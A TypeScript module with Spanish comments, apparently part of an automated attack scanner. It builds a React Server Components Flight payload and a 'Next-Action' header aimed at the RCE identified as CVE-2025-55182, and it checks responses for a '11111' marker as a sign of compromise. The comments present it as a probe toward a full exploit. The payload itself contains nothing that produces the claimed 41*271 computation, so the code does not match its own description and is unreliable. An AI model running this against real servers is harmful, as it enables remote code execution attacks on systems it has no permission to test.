import type { SmartVector } from '../AttackExecutor';

export class React2ShellVector {
  /**
   * Genera dinámicamente un SmartVector configurado para explotar CVE-2025-55182
   * Basado en la técnica documentada por Assetnote para React Server Actions
   */
  public static generateVector(targetUrl: string, endpoint: string): SmartVector {
    
    // Payload Flight Genérico que intenta ejecutar 41*271 para provocar
    // que la respuesta arroje un 11111 (Indicador de compromiso RCE ciego)
    // Se usa el formato estándar 1:I["..."] de React Server Components
    // NOTA: Para un exploit full se pasaría el binario a ejecutar, aquí buscamos confirmación de vulnerabilidad.
    
    const flightPayload = `1:I["react-server-dom-webpack/server.edge","",""]
2:I["react-server-dom-webpack/server.edge","",""]
3:I["react-server-dom-webpack/server.edge","",""]
4:I["react-server-dom-webpack/server.edge","",""]
5:I["react-server-dom-webpack/server.edge","",""]
6:I["react-server-dom-webpack/server.edge","",""]
7:I["react-server-dom-webpack/server.edge","",""]
8:I["react-server-dom-webpack/server.edge","",""]
9:I["react-server-dom-webpack/server.edge","",""]
0:["$","$L1",null,{"props":{"children":["$","$L2",null,{"props":{"children":["$","$L3",null,{"props":{"children":["$","$L4",null,{"props":{"children":["$","$L5",null,{"props":{"children":["$","$L6",null,{"props":{"children":["$","$L7",null,{"props":{"children":["$","$L8",null,{"props":{"children":["$","$L9",null,{"props":{"children":""}}]}}]}}]}}]}}]}}]}}]}}]}]
`;

    // Adaptamos el endpoint. En un escenario real iteraríamos sobre cada ruta detectada por el crawler
    const targetEndpoint = new URL(endpoint, targetUrl).toString();

    return {
      id: 'react2shell_cve_2025_55182',
      name: 'React2Shell Server Actions RCE (CVE-2025-55182)',
      severity: 'critical',
      attackType: 'RCE / Framework Abuse',
      endpoint: targetEndpoint,
      method: 'POST',
      baselinePayload: undefined, // No aplicable, no comparamos, buscamos la firma directa
      attackPayload: flightPayload,
      customHeaders: {
        'Next-Action': 'x', // Bypass para forzar Server Action handling
        'Content-Type': 'text/plain;charset=UTF-8',
      },
      customEvaluate: this.isVulnerable
    };
  }

  /**
   * Lógica de evaluación específica para este CVE
   * En lugar de usar el evaluateResponse genérico del AttackExecutor, usamos esta función especializada
   */
  public static isVulnerable(responseHeaders: Record<string, string>, responseData: string): boolean {
    // Si vemos X-Action-Redirect apuntando a nuestro 11111 (o el header crudo)
    // Significa que logramos inyectar lógica al compilador Flight del servidor.
    const redirectHeader = responseHeaders['x-action-redirect'] || responseHeaders['X-Action-Redirect'];
    
    if (redirectHeader && redirectHeader.includes('11111')) {
      return true;
    }
    
    // Fallback: A veces el error sale parseado en el body si el servidor está en development mode
    if (typeof responseData === 'string' && responseData.includes('11111') && responseData.includes('Error')) {
       return true;
    }

    return false;
  }
}
